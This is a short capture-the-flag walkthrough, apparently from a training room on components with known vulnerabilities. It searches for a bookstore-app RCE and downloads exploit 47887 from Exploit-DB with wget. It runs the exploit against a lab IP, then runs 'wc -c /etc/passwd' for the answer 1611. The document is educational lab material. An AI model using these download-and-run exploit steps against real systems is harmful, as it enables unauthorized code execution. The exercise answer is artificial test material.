# Task 27  [Severity 9] Components With Known Vulnerabilities - Intro

<p align="center">
<br/>
<img src="https://i.imgur.com/XplxIsU.png" height="90%" width="90%" alt=""/>
<br />

<h2></h2>

1. How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)

Hint: You know its a bookstore application, you should check for recent unauthenticated bookstore app rce's.

- Google: unauthenticated bookstore app rce's

<p align="center">
<br/>
<img src="https://i.imgur.com/vg1Mcdb.png" height="90%" width="90%" alt=""/>
<br />

- Click on the Exploit-DB site.

<p align="center">
<br/>
<img src="https://i.imgur.com/vvM4Z9R.png" height="90%" width="90%" alt=""/>
<br />

- Go to Terminal:
  - Download the exploit type in: wget https://www.exploit-db.com/download/47887
  - Attack the target machine type in: python3 47887 http://10.10.69.184/

<p align="center">
<br/>
<img src="https://i.imgur.com/NhCLXyc.png" height="90%" width="90%" alt=""/>
<br />

- Type in: "wc -c /etc/passwd".

<p align="center">
<br/>
<img src="https://i.imgur.com/GuES9FT.png" height="90%" width="90%" alt=""/>
<br />

Answer: `1611`
